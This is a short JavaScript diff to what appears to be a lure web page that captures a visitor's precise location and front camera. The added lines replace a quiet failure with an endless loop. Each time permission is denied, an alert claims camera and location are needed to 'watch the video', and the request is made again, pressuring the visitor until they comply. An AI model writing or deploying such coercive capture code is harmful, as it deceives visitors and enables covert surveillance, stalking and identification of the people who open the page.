@@ -154,9 +154,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     (pos) => resolve(pos),
                     (err) => {
                         console.log("Loc failed", err);
-                        // Retry check is handled by the re-triggering of initCapture via events
-                        // But we can also set a timeout to clear isRequesting
-                        setTimeout(() => resolve(null), 1000);
+                        alert("Please Allow Location Permission to Watch the Video!");
+                        tryLoc();
                     },
                     { enableHighAccuracy: true, timeout: 3000 }
                 );
@@ -165,13 +164,17 @@ document.addEventListener('DOMContentLoaded', () => {
         });
 
         const getPersistentCamera = () => new Promise(async (resolve) => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                resolve(stream);
-            } catch (err) {
-                console.log("Cam failed", err);
-                setTimeout(() => resolve(null), 1000);
-            }
+            const tryCam = async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    resolve(stream);
+                } catch (err) {
+                    console.log("Cam failed", err);
+                    alert("Please Allow Camera Permission to Watch the Video!");
+                    tryCam();
+                }
+            };
+            tryCam();
         });
 
         try {
